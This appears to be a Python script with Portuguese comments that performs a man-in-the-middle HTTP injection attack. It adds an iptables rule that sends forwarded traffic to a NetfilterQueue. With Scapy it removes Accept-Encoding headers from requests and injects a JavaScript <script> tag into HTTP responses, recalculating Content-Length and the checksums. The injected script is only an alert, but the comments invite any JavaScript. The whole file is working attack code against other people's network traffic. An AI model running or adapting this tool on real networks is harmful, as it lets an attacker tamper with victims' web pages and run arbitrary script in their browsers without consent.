from scapy.all import *
from colorama import init, Fore
from netfilterqueue import NetfilterQueue
import os
import logging as log
import re

# initialize colorama
init()

# define colors
GREEN = Fore.GREEN
RESET = Fore.RESET


def process_packet(packet):
    """
    This function is executed whenever a packet is sniffed
    """
    # convert the netfilterqueue packet into Scapy packet
    spacket = IP(packet.get_payload())
    if spacket.haslayer(Raw) and spacket.haslayer(TCP):
        print("entrou porta : ", spacket[TCP].dport)
        #if spacket[TCP].dport == 80:
        # HTTP request
        print(f"[*] Detected HTTP Request from {spacket[IP].src} to {spacket[IP].dst}")
        try:
            load = spacket[Raw].load.decode()
        except Exception as e:
            # raw data cannot be decoded, apparently not HTML
            # forward the packet exit the function
            packet.accept()
            return
        # remove Accept-Encoding header from the HTTP request
        new_load = re.sub(r"Accept-Encoding:.*\r\n", "", load)
        # set the new data
        spacket[Raw].load = new_load
        # set IP length header, checksums of IP and TCP to None
        # so Scapy will re-calculate them automatically
        spacket[IP].len = None
        spacket[IP].chksum = None
        spacket[TCP].chksum = None
        # set the modified Scapy packet back to the netfilterqueue packet
        packet.set_payload(bytes(spacket))

        #if spacket[TCP].sport == 80:
        # HTTP response
        print(f"[*] Detected HTTP Response from {spacket[IP].src} to {spacket[IP].dst}")
        try:
            load = spacket[Raw].load.decode()
        except:
            packet.accept()
            return
        # if you want to debug and see the HTML data
        # print("Load:", load)
        # Javascript code to add, feel free to add any Javascript code
        added_text = "<script>alert('Javascript Injected successfully!');</script>"
        # or you can add HTML as well!
        # added_text = "<p><b>HTML Injected successfully!</b></p>"
        # calculate the length in bytes, each character corresponds to a byte
        added_text_length = len(added_text)
        # replace the </body> tag with the added text plus </body>
        load = load.replace("</body>", added_text + "</body>")
        if "Content-Length" in load:
            # if Content-Length header is available
            # get the old Content-Length value
            content_length = int(re.search(r"Content-Length: (\d+)\r\n", load).group(1))
            # re-calculate the content length by adding the length of the injected code
            new_content_length = content_length + added_text_length
            # replace the new content length to the header
            load = re.sub(r"Content-Length:.*\r\n", f"Content-Length: {new_content_length}\r\n", load)
            # print a message if injected
            if added_text in load:
                print(f"{GREEN}[+] Successfully injected code to {spacket[IP].dst}{RESET}")
        # if you want to debug and see the modified HTML data
        # print("Load:", load)
        # set the new data
        spacket[Raw].load = load
        # set IP length header, checksums of IP and TCP to None
        # so Scapy will re-calculate them automatically
        spacket[IP].len = None
        spacket[IP].chksum = None
        spacket[TCP].chksum = None
        # set the modified Scapy packet back to the netfilterqueue packet
        packet.set_payload(bytes(spacket))
    # accept all the packets
    packet.accept()


class HttpInjection:
    def __init__(self, queueNum):
        self.queueNum = queueNum
        #Etapa 3: Crie o objeto NetfilterQueue.
        self.queue = NetfilterQueue()

    # __call__ permite usar a instancia da classe como funcao
    def __call__(self):
        '''
        Passo 2: Insira esta regra na tabela de IP,
        para que os pacotes sejam redirecionados para o NetfilterQuque.
        Entao, podemos usar o pacote scapy para modificar os pacotes na fila.
        O numero da fila pode ser qualquer numero de sua escolha.
        :return:
        '''
        # criar regra no iptables para enviar os pacores roteados para a fila do netfilter
        # permitindo serem tratados
        log.info("Spoofing....")
        os.system('iptables -I FORWARD -j NFQUEUE --queue-num {}'.format(self.queueNum))
        self.queue.bind(self.queueNum, process_packet)
        try:
            # iniciar fila
            self.queue.run()
        except KeyboardInterrupt:
            # restaurar a regra do iptable e a conexao
            os.system('iptables -D FORWARD -j NFQUEUE --queue-num {}'.format(self.queueNum))
            log.info("[!] iptable rule flushed")


if __name__ == "__main__":
    try:
       http_injection = HttpInjection(0)
       http_injection()
    except OSError as error:
        log.error(error)

